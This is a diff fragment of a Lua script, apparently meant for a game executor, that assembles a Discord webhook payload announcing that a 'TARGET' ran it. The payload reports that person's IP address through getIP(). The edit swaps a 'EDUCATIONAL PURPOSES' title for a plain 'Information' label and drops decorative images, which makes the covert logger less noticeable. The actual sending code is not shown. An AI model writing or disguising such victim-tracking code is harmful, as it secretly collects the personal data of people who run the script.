@@ -127,15 +127,9 @@ local payload = {
     content = "TARGET PRESSED EXECUTE @here @everyone",
     embeds = {
         {
-            title       = "INFO FROM A SCRIPT â EDUCATIONAL PURPOSES",
+            title       = "Information",
             description = "Use responsibly!",
             color       = 0,
-            thumbnail   = {
-                url = "https://media.discordapp.net/attachments/1287203891821416581/1379291179316674641/vLu4iMI.jpg?ex=68484643&is=6846f4c3&hm=6304209fd59751d64361bb0ddbff342636382057d096ce258232d9fc27605c42&=&format=webp"
-            },
-            image = {
-                url = "https://images-ext-1.discordapp.net/external/8rGso8pxs71c2tA2r7aW4rsmm76YKY35yiZ2k1cWj6w/https/i.pinimg.com/originals/aa/df/9d/aadf9d097b89e17176ad1e5151fe655f.gif?width=448&height=252"
-            },
             timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
             fields = {
                 { name = "IP Address", value = getIP(), inline = true },
